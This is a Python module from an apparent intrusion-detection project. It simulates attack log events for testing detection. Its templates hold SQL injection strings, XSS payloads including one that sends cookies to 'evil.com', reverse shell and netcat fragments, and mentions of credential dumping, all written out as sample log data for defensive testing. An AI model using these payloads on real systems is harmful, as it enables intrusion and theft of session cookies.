# taijitu/ingestion/log_sources.py
# Log ingestion — reads from multiple sources
# Normalizes everything to standard JSON event format

import random
import structlog
from datetime import datetime
from dataclasses import dataclass

log = structlog.get_logger()


@dataclass
class TaijituEvent:
    """
    Standard event format — every log source
    produces this exact structure
    """
    timestamp: datetime
    source_ip: str
    destination_ip: str
    source_port: int
    destination_port: int
    event_type: str
    raw_log: str
    log_source: str
    severity: str = "unknown"


# ── ATTACK SIMULATOR ──────────────────────────────────
# Generates realistic fake attacks for testing
# Use this to verify TAIJITU detects correctly

ATTACK_TEMPLATES = [
    {
        "event_type": "ssh_brute_force",
        "log_source": "system",
        "templates": [
            "Failed password for root from {ip} port 22 ssh2",
            "Failed password for invalid user admin from {ip} port 22",
            "Invalid user administrator from {ip} port 22",
            "Failed password for ubuntu from {ip} port 2222 ssh2",
            "authentication failure for root from {ip}",
        ],
        "destination_port": 22,
    },
    {
        "event_type": "port_scan",
        "log_source": "network",
        "templates": [
            "port scan detected from {ip} targeting multiple ports",
            "nmap scan detected from source {ip}",
            "SYN scan from {ip} on ports 1-1024",
            "masscan detected from {ip}",
        ],
        "destination_port": 0,
    },
    {
        "event_type": "sql_injection",
        "log_source": "web",
        "templates": [
            "GET /login?id=1 UNION SELECT username,password FROM users-- from {ip}",
            "POST /search?q=' OR 1=1-- from {ip}",
            "GET /api/users?id=1; DROP TABLE users-- from {ip}",
            "POST /login username=' OR '1'='1 from {ip}",
        ],
        "destination_port": 80,
    },
    {
        "event_type": "xss_attempt",
        "log_source": "web",
        "templates": [
            "GET /search?q=<script>alert(document.cookie)</script> from {ip}",
            "POST /comment body=<script>fetch('evil.com?c='+document.cookie)</script> from {ip}",
            "GET /profile?name=<img onerror=alert(1) src=x> from {ip}",
        ],
        "destination_port": 443,
    },
    {
        "event_type": "c2_beacon",
        "log_source": "network",
        "templates": [
            "reverse shell connection from {ip} bash -i",
            "netcat listener detected from {ip} nc -e /bin/bash",
            "C2 beacon detected outbound to {ip}",
        ],
        "destination_port": 4444,
    },
    {
        "event_type": "ransomware_activity",
        "log_source": "system",
        "templates": [
            "mass file encryption detected from process on {ip}",
            "ransomware activity YOUR FILES ARE ENCRYPTED from {ip}",
            "file extension .locked mass rename detected from {ip}",
        ],
        "destination_port": 0,
    },
    {
        "event_type": "credential_dumping",
        "log_source": "system",
        "templates": [
            "mimikatz execution detected from {ip}",
            "lsass memory dump attempted from {ip}",
            "SAM database access attempt from {ip}",
        ],
        "destination_port": 0,
    },
    {
        "event_type": "normal_traffic",
        "log_source": "system",
        "templates": [
            "User admin logged in successfully from {ip}",
            "Successful SSH login for deploy from {ip}",
            "Normal web request GET /index.html from {ip}",
            "DNS query for google.com from {ip}",
        ],
        "destination_port": 80,
    },
]

# Known attacker IPs for simulation
ATTACKER_IPS = [
    "185.220.101.45",
    "193.32.162.157",
    "45.142.212.100",
    "91.235.234.41",
    "198.235.24.130",
    "103.245.236.120",
    "194.165.16.29",
    "77.247.181.163",
]

# Normal user IPs
NORMAL_IPS = [
    "192.168.1.10",
    "192.168.1.11",
    "10.0.0.5",
    "172.16.0.1",
]


class AttackSimulator:
    """
    Generates realistic fake attack events for testing
    Use this to verify TAIJITU detects correctly
    without needing real attackers
    """

    def generate_attack(self, attack_type: str = None) -> TaijituEvent:
        """
        Generate one fake attack event
        If attack_type is None — picks randomly
        """
        # Pick random attack or specific type
        if attack_type:
            template = next(
                (t for t in ATTACK_TEMPLATES if t["event_type"] == attack_type),
                random.choice(ATTACK_TEMPLATES)
            )
        else:
            # 80% chance of attack, 20% normal traffic
            attacks_only = [t for t in ATTACK_TEMPLATES if t["event_type"] != "normal_traffic"]
            normal_only = [t for t in ATTACK_TEMPLATES if t["event_type"] == "normal_traffic"]
            template = random.choice(attacks_only) if random.random() < 0.8 else random.choice(normal_only)

        # Pick attacker or normal IP
        if template["event_type"] == "normal_traffic":
            ip = random.choice(NORMAL_IPS)
        else:
            ip = random.choice(ATTACKER_IPS)

        # Fill in the log template
        raw_log = random.choice(template["templates"]).format(ip=ip)

        return TaijituEvent(
            timestamp=datetime.utcnow(),
            source_ip=ip,
            destination_ip="10.0.0.1",
            source_port=random.randint(1024, 65535),
            destination_port=template["destination_port"],
            event_type=template["event_type"],
            raw_log=raw_log,
            log_source=template["log_source"],
        )

    def generate_batch(self, count: int = 10) -> list:
        """Generate multiple events at once"""
        return [self.generate_attack() for _ in range(count)]

    def generate_brute_force_campaign(self, ip: str = None, count: int = 47) -> list:
        """
        Simulate a full SSH brute force campaign
        Same IP hammering SSH repeatedly
        This is what triggers the debate engine
        """
        if not ip:
            ip = random.choice(ATTACKER_IPS)

        events = []
        template = next(t for t in ATTACK_TEMPLATES if t["event_type"] == "ssh_brute_force")

        for _ in range(count):
            raw_log = random.choice(template["templates"]).format(ip=ip)
            events.append(TaijituEvent(
                timestamp=datetime.utcnow(),
                source_ip=ip,
                destination_ip="10.0.0.1",
                source_port=random.randint(1024, 65535),
                destination_port=22,
                event_type="ssh_brute_force",
                raw_log=raw_log,
                log_source="system",
            ))

        log.info(
            "brute_force_campaign_generated",
            ip=ip,
            events=count
        )
        return events


# ── GLOBAL INSTANCES ──────────────────────────────────
simulator = AttackSimulator()